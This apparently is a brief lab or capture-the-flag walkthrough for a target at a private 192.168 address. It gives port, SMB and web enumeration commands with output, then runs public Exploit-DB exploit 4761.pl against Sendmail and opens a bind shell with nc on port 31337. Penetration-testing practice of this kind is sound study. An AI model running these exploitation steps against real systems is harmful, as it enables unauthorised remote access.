```ip
192.168.172.42
```
___
# Enumeration
## Nmap
```bash
nmap -p- -sC -sV -T5 -Pn  192.168.172.42 -oN ClamAVNmap.txt -vv
```

```bash
PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 61 OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
25/tcp    open  smtp        syn-ack ttl 61 Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.206], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP-
80/tcp    open  http        syn-ack ttl 61 Apache httpd 1.3.33 ((Debian GNU/Linux))
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
|_http-title: Ph33r
139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp   open  smux        syn-ack ttl 61 Linux SNMP multiplexer
445/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
60000/tcp open  ssh         syn-ack ttl 61 OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
```

## SMB
```bash
smbmap -H 192.168.172.42 
```

```bash
[+] IP: 192.168.172.42:445      Name: 192.168.172.42            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (0xbabe server (Samba 3.
        ADMIN$                                                  NO ACCESS       IPC Service (0xbabe server (Samba 3.
[*] Closed 1 connections
```
___

## WEB

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt:FFUZ -u http://192.168.172.42/FFUZ 
```


```bash
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 11, Duration: 1799ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 11, Duration: 3768ms]
cgi-bin/                [Status: 403, Size: 277, Words: 20, Lines: 11, Duration: 91ms]
doc                     [Status: 403, Size: 272, Words: 20, Lines: 11, Duration: 89ms]
index                   [Status: 200, Size: 289, Words: 21, Lines: 12, Duration: 86ms]
```

## Searchsploit
```bash
searchsploit Sendmail   
```

# RCE
```bash
perl /usr/share/exploitdb/exploits/multiple/remote/4761.pl 192.168.172.42
```

```bash
nc 192.168.172.42 31337
```
